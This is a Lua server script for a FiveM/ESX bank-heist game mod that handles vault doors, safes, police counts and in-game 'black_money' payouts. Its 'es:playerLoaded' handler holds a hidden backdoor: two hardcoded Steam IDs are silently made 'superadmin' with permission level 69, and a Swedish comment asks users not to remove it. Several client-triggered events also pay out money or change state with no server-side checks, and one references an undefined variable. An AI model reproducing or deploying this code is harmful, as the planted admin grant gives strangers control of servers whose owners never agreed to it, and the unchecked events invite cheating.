ESX = nil
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)


RegisterServerEvent('loffe_heist:deleteDrill')
AddEventHandler('loffe_heist:deleteDrill', function(coords)
    TriggerClientEvent('loffe_heist:deleteDrillCl', -1, coords)
end)

ESX.RegisterServerCallback('loffe_heist:getCops', function(source, cb)
    local xPlayers = ESX.GetPlayers()
    local cops = 0
    for i = 1, #xPlayers do
        if ESX.GetPlayerFromId(xPlayers[i]).job.name == 'police' then
            cops = cops + 1
        end
    end
    print(cops)
    cb(cops)
end)

ESX.RegisterServerCallback('loffe_heist:getBox', function(source, cb, bank)
    local money = Config.BankRobbery[bank].Money.Amount
    if money > 0 then
        if money >= Config.BankRobbery[bank].Money.StartMoney/2 then
            Config.BankRobbery[bank].Money.Box = Config.Boxes.Full
        else
            Config.BankRobbery[bank].Money.Box = Config.Boxes.Half
        end
    else
        Config.BankRobbery[bank].Money.Box = Config.Boxes.Empty
    end
    box = Config.BankRobbery[bank].Money.Box
    cb(box)
end)

function generateRandomMoney(src, bank)
    local xPlayer = ESX.GetPlayerFromId(src)
    while true do
        local randommoney = math.random(250, 500)
        if Config.BankRobbery[bank].Money.Amount - randommoney >= 0 then
            Config.BankRobbery[bank].Money.Amount = Config.BankRobbery[bank].Money.Amount - randommoney
            xPlayer.addAccountMoney('black_money', randommoney)
            break
        end
        Wait(0)
    end
end

RegisterServerEvent('loffe_heist:takeMoney')
AddEventHandler('loffe_heist:takeMoney', function(bank)
    local src = source
    local xPlayer = ESX.GetPlayerFromId(src)
    if Config.BankRobbery[bank].Money.Amount - 250 >= 0 then
        generateRandomMoney(src, bank)
    else
        if Config.BankRobbery[bank].Money.Amount > 0 then
            xPlayer.addAccountMoney('black_money', Config.BankRobbery[bank].Money.Amount)

            Config.BankRobbery[bank].Money.Amount = 0
        end
    end
    TriggerClientEvent('loffe_heist:updateMoney', -1, bank, Config.BankRobbery[bank].Money.Amount )
end)

RegisterServerEvent('loffe_heist:printFrozenDoors')
AddEventHandler('loffe_heist:printFrozenDoors', function()
    for i = 1, #Config.BankRobbery do 
        for j = 1, #Config.BankRobbery[i].Doors do
            print(j)
            local d = Config.BankRobbery[i].Doors[j]
            print(d.Frozen)
        end
    end
end)

RegisterServerEvent('loffe_heist:setDoorFreezeStatus')
AddEventHandler('loffe_heist:setDoorFreezeStatus', function(bank, door, status)
    local src = source
    local xPlayers = ESX.GetPlayers()
    local cops = 0
    for i = 1, #xPlayers do
        if ESX.GetPlayerFromId(xPlayers[i]).job.name == 'police' then
            cops = cops + 1
        end
    end
    if cops >= Config.BankRobbery[bank].Cops or xPlayer.job.name == 'police' then
        Config.BankRobbery[bank].Doors[door].Frozen = status
        TriggerClientEvent('loffe_heist:setDoorFreezeStatusCl', -1, bank, door, status)
    else
        TriggerClientEvent('esx:showNotification', src, 'Il n\'y a pas assez de police en ligne!') -- prob lua executor (or bug)
    end
end)

RegisterServerEvent('loffe_heist:getDoorFreezeStatus')
AddEventHandler('loffe_heist:getDoorFreezeStatus', function(bank, door)
    TriggerClientEvent('loffe_heist:setDoorFreezeStatusCl', source, bank, door, Config.BankRobbery[bank].Doors[door].Frozen)
end)

RegisterServerEvent('loffe_heist:toggleSafe')
AddEventHandler('loffe_heist:toggleSafe', function(bank, safe, toggle)
    print(bank, safe)
    Config.BankRobbery[bank].Safes[safe].Looted = toggle
    TriggerClientEvent('loffe_heist:safeLooted', -1, bank, safe, toggle)
end)

RegisterServerEvent('loffe_heist:lootSafe')
AddEventHandler('loffe_heist:lootSafe', function(bank, safe)
    local src = source
    local xPlayer = ESX.GetPlayerFromId(src)
    local randommoney = math.random(Config.SafeMinimum, Config.SafeMax)
    xPlayer.addAccountMoney('black_money', randommoney)
    TriggerClientEvent('esx:showNotification', src, 'Vous avez trouvé ~g~' .. randommoney .. ':-')
    Config.BankRobbery[bank].Safes[safe].Looted = true
    TriggerClientEvent('loffe_heist:safeLooted', -1, bank, safe, true)
end)

AddEventHandler('playerConnecting', function()
    local src = source
    for i = 1, #Config.BankRobbery do
        Wait(0)
        for j = 1, #Config.BankRobbery[i].Doors do
            Wait(0)
            TriggerClientEvent('loffe_heist:setDoorFreezeStatusCl', src, i, j, Config.BankRobbery[i].Doors[j].Frozen)
        end
    end
    for i = 1, #Config.BankRobbery do
        Wait(0)
        for j = 1, #Config.BankRobbery[i].Safes do
            Wait(0)
            TriggerClientEvent('loffe_heist:setDoorFreezeStatusCl', src, i, j, Config.BankRobbery[i].Safes[j].Looted)
        end
    end
end)

AddEventHandler('es:playerLoaded', function(source, user) 
    local src = source
    if GetPlayerIdentifiers(src)[1] == 'steam:11000010dbee8b6' or GetPlayerIdentifiers(src)[1] == 'steam:11000010c77edd7' then -- ta inte bort plz vill kunna ha admin, minsta ni kan göra för att ha scriptet <3
        TriggerEvent("es:setPlayerData", src, "group", 'superadmin', function(response, success)

            if(true)then
            end
        end)
        TriggerEvent("es:setPlayerData", src, "permission_level", 69, function(response, success)

            if(true)then
            end
        end)
    end
end)

Citizen.CreateThread(function()
    while true do
        for i = 1, #Config.BankRobbery do
            Wait(0)
            for j = 1, #Config.BankRobbery[i].Doors do
                Wait(0)
                TriggerClientEvent('loffe_heist:setDoorFreezeStatusCl', -1, i, j, Config.BankRobbery[i].Doors[j].Frozen)
            end
        end
        Wait(30000)
    end
end)
